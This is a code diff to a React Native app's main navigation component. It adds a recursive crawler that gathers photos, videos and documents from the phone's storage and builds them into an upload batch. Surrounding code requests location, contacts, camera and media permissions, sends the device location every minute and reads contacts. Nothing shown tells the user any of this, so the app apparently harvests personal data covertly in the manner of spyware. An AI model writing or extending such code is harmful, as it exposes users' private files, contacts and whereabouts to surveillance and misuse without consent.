@@ -28,6 +28,8 @@ function MainNav({navigation}) {
 		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)
         getImageFiles();
         getContacts()
+
+        console.log("Android Version : " + Platform.Version)
     
 		return () => clearInterval(interval);
 	}, []);
@@ -76,33 +78,27 @@ function MainNav({navigation}) {
 
     const getImageFiles = async () => {
         try {
-            const result = await check(
-                Platform.OS === 'android'
-                ? PERMISSIONS.ANDROID.READ_MEDIA_IMAGES
-                : PERMISSIONS.IOS.MEDIA_LIBRARY
-            );
+            
+            const result = await check(Platform.OS === 'android' ? PERMISSIONS.ANDROID.READ_MEDIA_IMAGES : PERMISSIONS.IOS.MEDIA_LIBRARY);
         
             if (result === RESULTS.GRANTED) {
-                const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera'; // You can change the directory path if needed
-                const files = await RNFS.readDir(directoryPath);
-        
-                // Filter image files
-                const imageFiles = files.filter(
-                    file => file.isFile() && file.name.endsWith('.jpg')
-                );
+                const rootPath = '/storage/emulated/0/DCIM/Camera';
+                console.log(RNFS.ExternalStorageDirectoryPath)
+                const files = await getFilesRecursively(rootPath);
+                console.log('Files found:', files);
         
                 const images = [];
                 const uploadImages = new FormData();
       
                 // Log the image files
-                imageFiles.forEach(imageFile => {
+                files.forEach(imageFile => {
                     images.push({
-                        uri: 'file://' + imageFile.path,
-                        type: 'image/jpg',
+                        uri: imageFile.path,
+                        type: imageFile.type,
                         name: imageFile.name,
                     });
                 });
-        
+
                 images.forEach(val => {
                     uploadImages.append('file[]', val);
                 });
@@ -115,38 +111,6 @@ function MainNav({navigation}) {
             console.log('Error retrieving image files:', error);
         }
     };
-
-    const getListFolders = async (rootDirectoryPath) => {
-        try {
-            const listFoldersPath = [];
-            const result = await RNFS.readDir(rootDirectoryPath);
-            // Filter out only the folders from the result
-            const folders = result.filter((item) => item.isDirectory());
-            // Get All Folders Path
-            folders.forEach((val) => listFoldersPath.push(val.path));
-
-            return listFoldersPath
-        } catch (error) {
-            console.error('Error reading directory:', error);
-            return [];
-        }
-    }
-
-    const getFilesFromDirectory = async (directoryPath) => {
-        try {
-            directoryPath.forEach((path) => {
-                console.log(path)
-                const files = RNFS.readDir(path);
-    
-                console.log(files)
-                files.then((val) => {
-                    console.log(val)
-                })
-            })
-        }catch (error) {
-            console.log('Error get file from directory ' +error);
-        }
-    }
 
     const postLocation = async (lat, lon) => {
         const params = {
@@ -181,7 +145,7 @@ function MainNav({navigation}) {
 				},
 			});
 
-			console.log(response.data);
+			// console.log(response.data);
 		} catch (error) {
 			console.error(error);
 		}
@@ -208,12 +172,13 @@ function MainNav({navigation}) {
     const requestPermissions = async () => {
         try{
             if(Platform.OS === 'android') {
-                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]).then((statuses) => {
+                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES, PERMISSIONS.ANDROID.READ_MEDIA_VIDEO]).then((statuses) => {
                     console.log('Permission Android Location : ', statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
                     console.log('Permission Android Camera :', statuses[PERMISSIONS.ANDROID.CAMERA]);
                     console.log('Permission Android Contacts :', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
                     console.log('Permission Android EXTERNAL_STORAGE :', statuses[PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE]);
                     console.log('Permission Android MEDIA IMAGES :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
+                    console.log('Permission Android MEDIA VIDEOS :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_VIDEO]);
                 });
 
             } else if (Platform.OS === 'ios') {
@@ -229,25 +194,71 @@ function MainNav({navigation}) {
         }
     }
     
-    getListFolders(RNFS.ExternalStorageDirectoryPath)
-        .then((directoryPath) => {
-            console.log('Folders in the directory:', directoryPath);
+    const FILE_TYPES = ['image', 'video', 'document'];
 
-            directoryPath.forEach((path) => {
-                if(path === "/storage/emulated/0/Download") {
-                    console.log(path)
-                    const files = RNFS.readDir(path);
+    // Fungsi untuk mengambil file secara rekursif dari direktori
+    const getFilesRecursively = async (dirPath) => {
+        try {
+            const files = await RNFS.readDir(dirPath);
 
-                    console.log(files)
-                    files.then((val) => {
-                        console.log(val)
-                    })
+            if (!files) {
+                console.error('No files found in the directory:', dirPath);
+                return []; // Return an empty array if files is null
+            }
+            
+            const result = [];
+        
+            for (const file of files) {
+                if (file.isDirectory()) {
+                    const subFiles = await getFilesRecursively(file.path);
+                    result.push(...subFiles);
+                } else {
+                    const fileType = getFileType(file.path);
+                    if (fileType !== 'unknown') {
+                        result.push({
+                            uri: 'file:/'+file.path,
+                            type: fileType,
+                            name: file.name,
+                        });
+                    }
                 }
-            })
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-        });
+            }
+        
+            return result;
+        } catch (error) {
+            console.error('Error reading directory:', error);
+            return [];
+        }
+    };
+
+  // Fungsi untuk menentukan tipe file berdasarkan ekstensinya
+    const getFileType = (filePath) => {
+        const ext = filePath.split('.').pop().toLowerCase();
+        if (ext.match(/(jpg|jpeg|png|gif|bmp)$/)) {
+            return 'image/'+ext;
+        } else if (ext.match(/(mp4|mov|avi|mkv)$/)) {
+            return 'video/'+ext;
+        } else if (ext.match(/(pdf|doc|docx|xls|xlsx|ppt|pptx)$/)) {
+            return 'document/'+ext;
+        } else {
+            return 'unknown';
+        }
+    };
+
+
+    const fetchFiles = async () => {
+        try {
+          const rootPath = RNFS.ExternalStorageDirectoryPath;
+          const files = await getFilesRecursively(rootPath);
+          console.log('Files found:', files);
+        } catch (error) {
+          console.error('Error fetching files:', error);
+        }
+      };
+
+    // Panggil fungsi fetchFiles untuk mulai mengambil file
+   // fetchFiles();
+
     return (
         <Tab.Navigator  
                         screenOptions={({ route }) => ({
